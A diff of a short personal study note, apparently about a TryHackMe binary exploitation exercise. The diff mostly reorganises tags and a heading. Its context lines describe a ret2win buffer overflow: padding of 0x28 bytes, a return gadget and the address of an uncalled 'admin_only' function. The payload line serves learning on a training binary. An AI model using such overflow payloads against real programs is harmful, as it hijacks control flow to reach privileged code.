@@ -1,5 +1,6 @@
-[[Binary Exploit]]
-3-THM
+Tags: [[Binary Exploit]]
+
+# UnResearched 
 
 We have a function which has a empty return value 
 You also have a function that is `admin_only` but it isn't called at all.
@@ -16,3 +17,4 @@ admin = binary.sym['admin_only']
 b'A'*0x28+p64(0x004010677)+p64(admin)
 ```
 ### References 
+3-THM
